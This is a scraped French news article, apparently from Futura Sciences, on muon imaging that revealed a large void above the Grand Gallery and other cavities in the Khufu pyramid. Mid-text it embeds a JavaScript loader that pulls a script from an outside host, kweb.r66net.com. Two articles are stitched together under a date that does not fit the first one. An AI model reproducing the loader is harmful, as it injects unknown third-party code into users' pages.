{"title": "Pyramide de Kheops : une grande cavite decouverte a l'interieur", "newspaper": "Futura Sciences", "author": ["Xavier Demeersman"], "date_publi": "2016-10-17", "content": "La plus grande pyramide de Gizeh renferme en son coeur un espace vide reste inconnu jusqu'ici. Cette vaste cavite a ete decouverte grace a la collaboration de physiciens des particules et d'archeologues. De quoi s'agit-il ? Les grandes pyramides egyptiennes sont encore loin d'avoir livre tous leurs secrets. En ce debut de XXI e  siecle des archeologues associes a trois equipes de muographes ont fait une decouverte surprenante a l'interieur de la  pyramide de Kheops  construite il y a plus de 4.500 ans par le  pharaon  Khufu (Kheops est sa transcription grecque), entre 2613 a 2494 avant J.-C., la plus grande de celles du plateau Gizeh. A travers des approches differentes qui leur sont specifiques, trois equipes qui ont reparti des  capteurs  de  muons  a l'interieur ou a l'exterieur de la structure de 139 metres de hauteur a partir de decembre 2015, sont arrivees au meme constat : un espace vide d'au minimum 30 metres de long, situe a 21 metres du sol, s'etend au-dessus de la grande galerie, ou couloir descendant. Pour l'instant, ils ont du mal a definir s'il est parallele au couloir ou horizontal. L'emplacement est curieux car il est situe au-dessus des structures funeraires connues jusque-la et constituant un << monument dans le monument >>. Un grand vide d'environ 30 metres de longueur a ete decouvert au-dessus de la Grande galerie a l'interieur de la pyramide de Kheops. (c)  ScanPyramids mission                               Une cavite probablement volontairement creee Cet espace est inaccessible. Se gardant de speculer sur la nature de ce vide a l'interieur de cet edifice qui, rappelons-le, fut le plus haut du monde durant 38 siecles, les physiciens laissent le soin d'interpreter aux archeologues. Quoi qu'il en soit, il leur apparait comme tres probable que ce vide a ete menage deliberement. En effet, les possibilites d'un effondrement ou de crevasses creees par l'usure ont ete abandonnees. La technique des muons ne permet que de detecter de grands espaces et non de petits trous. En outre, les auteurs de cette etude qui vient de paraitre dans  Nature  soulignent que leurs mesures ressemblent a celles obtenues au niveau de la Grande galerie.   ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Alors, de quoi s'agit-il ? L'hypothese d'une chambre cachee n'est pas exclue par les archeologues du projet ScanPyramids. Mais il est encore trop tot pour l'affirmer. La grande question maintenant est : comment faire pour en savoir plus ? La zone semble isolee. Faut-il creuser un acces au risque de deteriorer l'edifice (les sondages destructifs ne sont d'ailleurs en principe pas autorises)  ? Un minuscule robot comme celui que met au point Jean-Baptiste Mouret, membre de ScanPyramids, pourrait en faire une exploration prudente... Dans un premier temps, il est surtout envisage de faire des mesures supplementaires avec les muons, pour gagner en precision et eventuellement y detecter des objets ou accessoires. La decouverte est en tout cas un bel exemple de collaboration interdisciplinaire. Forte de ses quelque 2,3 millions de blocs, la  pyramide de Kheops  garde enfouis en son coeur encore bien des secrets et, qui sait, des tresors. Le saviez-vous ? Pourquoi les muons ?  << Comme les rayons X qui peuvent penetrer le corps et permettre l'imagerie osseuse, ces particules elementaires peuvent garder une trajectoire quasi-lineaire en traversant des centaines de metres de pierres avant de se desintegrer ou d'etre absorbees >> , expliquent les auteurs de l'etude. Les muons qui pleuvent sur la Terre decoulent des interactions des rayons cosmiques avec les atomes de la haute atmosphere. L'analyse de leur trajectoire peut aider les chercheurs a reveler des vides a l'interieur de structures solides. La detection a l'aide de muons n'est pas une premiere. Elle a deja permis d'identifier des vides dans la pyramide de Kheops, et aussi d'autres, en Egypte et au Mexique Pour en savoir plus Deux vides caches decouverts dans la pyramide de Kheops Article de Jean-Luc Goudet publie le 17 octobre 2016 En traquant les muons, c'est-a-dire en s'aidant des  rayons cosmiques , l'equipe internationale du projet ScanPyramids suspecte la presence de deux cavites inconnues. L'une pourrait etre une piece cachee et l'autre correspond tres bien a l'une des predictions de la these de l'architecte Jean-Pierre Houdin. L'equipe de  ScanPyramids  a presente les derniers resultats de son analyse par << muographie >> de la pyramide de Kheops. Lance en octobre 2015, ce programme reunit de nombreuses equipes scientifiques et des entreprises comme Dassault Systemes, pour ses  logiciels  de simulation, et Iconem, pour son savoir-faire en  matiere  de  drones  archeologiques.  Modelisation  3D et  thermographie  infrarouge font partie de leurs armes mais ici, ce sont les muons qui ont parle, comme l'explique le  communique de presse de ScanPyramids . Produits par les rayons cosmiques quand ils percutent les  atomes  et les  molecules  de la haute  atmosphere , ils traversent ensuite tout ce qui se trouve sur leur passage tels des passe-muraille, sauf quand, tout de meme, quelques-uns d'entre eux sont absorbes par la matiere. Si l'on peut en intercepter, il est possible d'exploiter cette sorte de  scanner  naturel. Les capteurs sont des plaques d' aluminium  recouvertes d'un film sensible que l'on dispose par exemple dans une pyramide. Si une cavite est presente, la densite de muons recoltes ne sera pas homogene, trahissant un deficit de matiere le long du trajet des muons. Cette technique est connue et avait deja ete utilisee par la meme equipe sur la pyramide rhomboidale du site Dahchour. Voir aussi : La pyramide de Snefrou scannee... avec des rayons cosmiques .\n Dessin des chevrons mis au jour au fil des siecles par l'arrachage de blocs de pierre de la facade nord. Les globules blancs indiquent les zones ou la muographie a detecte un deficit de matiere. La forme et la dimension de cette cavite restent inconnues. Le dessin montre les couloirs. (c) ScanPyramids                               Une chambre ou un ensemble de couloirs Pour la  pyramide de Kheops , le programme ScanPyramids s'est focalise sur deux endroits. Le premier est une partie de la face nord depossedee de ses blocs de pierre (au fil des siecles et non pour les etudes, qui doivent etre rigoureusement non destructives). Ce trou laisse apparaitre quatre gros  chevrons  de pierre. Ils se trouvent au-dessus d'un petit couloir qui descend et qui est aligne avec la grande galerie inclinee rejoignant les chambres funeraires. Deux analyses thermiques par  infrarouge  avaient montre une  anomalie  a cet endroit, compatible avec une cavite cachee. L'hypothese est plausible car des chevrons de ce genre existent dans cette pyramide au-dessus de la chambre du roi et de celle de la reine. Ce ne sont donc pas des motifs decoratifs mais des structures de soutien surplombant une cavite de grande taille. Alors pourquoi en installer loin au-dessus d'un simple petit couloir ? En juin 2016, des chercheurs de l'universite de Nagoya (Japon) ont pose trois plaques sensibles aux muons en bas du couloir descendant, et les ont laissees 67 jours. Resultat : il y a bien un exces du flux de ces particules dans une certaine direction, pointant vers un vide de forme rectiligne. Dans le langage des physiciens, la mesure est fiable a plus de 5 sigmas, ce qui signifie que la probabilite d'un signal obtenu par le simple hasard est de moins de 0,0001 %.  << Nous pouvons confirmer l'existence d'une cavite, cachee derriere la face nord, qui laisse deviner un ou plusieurs couloirs superposes qui s'enfoncent dans le coeur de la  Grande Pyramide  >> , conclut le communique de presse. En revanche, les dimensions et la forme de cette structure restent a preciser et le seront peut-etre grace aux 12 nouvelles plaques installees ce mois-ci au meme endroit. Resultat de la muographie sur l'arete nord-est au niveau de trois encoches, visibles de l'exterieur (N1, N2 et N3). L'analyse montre la presence de deux cavites, C1 et C2, la premiere etant jusque-la inconnue. Quel interet y avait-il a laisser de telles cavites, fragilisant les aretes ? (c) ScanPyramids                               Des decouvertes sont a venir car les recherches continuent L'autre decouverte concerne l'arete nord-est avec une etude par muographie de trois << encoches >> connues depuis longtemps. Sur l'une d'entre elles (<< N2 >>), la detection a decele une cavite (<< C2 >>)... qui etait deja connue, ce qui a eu le merite de valider la methode. La detection d'une cavite C1 derriere l'encoche N1, inconnue celle-la, est une vraie decouverte. On ne peut s'empecher de penser a la theorie de l'architecte  Jean-Pierre Houdin  (voir notre dossier) qui prevoyait de telles cavites au niveau des aretes. Son hypothese est celle d'un couloir interieur, juste derriere les facades, construit tandis que s'elevait la pyramide et qui servait, tout simplement, a monter les blocs. Avec les logiciels de Dassault Systemes, Jean-Pierre Houdin avait construit une  simulation de la construction , avec reconstitution du chantier, tenant compte des moyens de l'epoque, de la force humaine et des temps de travail, ainsi que de la construction elle-meme, avec calcul des contraintes mecaniques et des dimensionnements necessaires. Il apparaissait qu'au niveau des aretes, les hommes devaient faire pivoter leur chariot de 90deg, ce qui imposait un elargissement du tunnel pour former une plateforme de manoeuvre : voila une hypothese pour les cavites C1 et C2... Ces conclusions n'ont rien de definitif mais ces resultats demontrent l'efficacite des techniques actuellement a l'oeuvre. Ils ont du fortement motiver les equipes et les recherches se poursuivent. Une analyse par muographie est d'ailleurs en cours au niveau de la chambre de la reine, qui pourrait etre flanquee d'une autre piece. Les experts du passe : les Gaulois mangeaient-ils romain ?                       La conquete de la Gaule par les Romains a grandement modifie les traditions gauloises. Ce changement se manifeste par exemple dans les habitudes alimentaires et tout particulierement par la vaisselle utilisee lors de la cuisine. L'Inrap nous en parle dans ce nouvel episode des Experts du passe.                                       ", "theme": "sciences"}